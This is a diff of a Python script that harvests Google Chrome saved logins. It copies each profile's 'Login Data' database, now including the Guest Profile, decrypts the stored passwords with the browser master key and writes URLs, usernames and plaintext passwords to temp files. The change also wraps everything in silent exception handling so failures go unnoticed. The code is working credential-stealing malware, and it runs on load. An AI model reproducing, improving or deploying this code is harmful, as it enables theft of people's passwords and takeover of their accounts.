@@ -39,42 +39,44 @@ def decrypt_password(buff, master_key):
 
 def password():
     main_loc = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data' + os.sep
-    possible_location = ["Default"]
+    possible_location = ["Default", "Guest Profile"]
     for folder in os.listdir(main_loc):
         if "Profile " in folder:
             possible_location.append(folder)
-
     master_key = get_master_key()
     for loc in possible_location:
-        path_db = main_loc + loc + os.sep + 'Login Data'
-        db_loc = temp() + os.sep + "Loginvault.db"
-        shutil.copy2(path_db, db_loc) #making a temp copy since Login Data DB is locked while Chrome is running
-        conn = sqlite3.connect(db_loc)
-        cursor = conn.cursor()
-        #print(path_db)
         try:
-            fileloc = os.path.join(temp(),'Chrome_'+loc+".txt")
-            with open(fileloc,'w') as f:
-                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                for r in cursor.fetchall():
-                    url = r[0]
-                    username = r[1]
-                    encrypted_password = r[2]
-                    decrypted_password = decrypt_password(encrypted_password, master_key)
-                    if len(username) > 0:
-                        s = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "\n"
-                        f.write(s)
-                        #print(s)
-                f.close()
-        except Exception as e:
-            #print(e)
-            pass
-        cursor.close()
-        conn.close()
-        try:
-            os.remove(db_loc)
-            time.sleep(0.2)
-        except Exception as e:
+            path_db = main_loc + loc + os.sep + 'Login Data'
+            db_loc = temp() + os.sep + "Loginvault.db"
+            shutil.copy2(path_db, db_loc) #making a temp copy since Login Data DB is locked while Chrome is running
+            conn = sqlite3.connect(db_loc)
+            cursor = conn.cursor()
+            #print(path_db)
+            try:
+                fileloc = os.path.join(temp(),'Chrome_'+loc+".txt")
+                with open(fileloc,'w') as f:
+                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                    for r in cursor.fetchall():
+                        url = r[0]
+                        username = r[1]
+                        encrypted_password = r[2]
+                        decrypted_password = decrypt_password(encrypted_password, master_key)
+                        if len(username) > 0:
+                            s = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "\n"
+                            f.write(s)
+                            #print(s)
+                    f.close()
+            except Exception as e:
+                #print(e)
+                pass
+            cursor.close()
+            conn.close()
+            try:
+                os.remove(db_loc)
+                time.sleep(0.2)
+            except Exception as e:
+                pass
+        except:
             pass
 
 password()
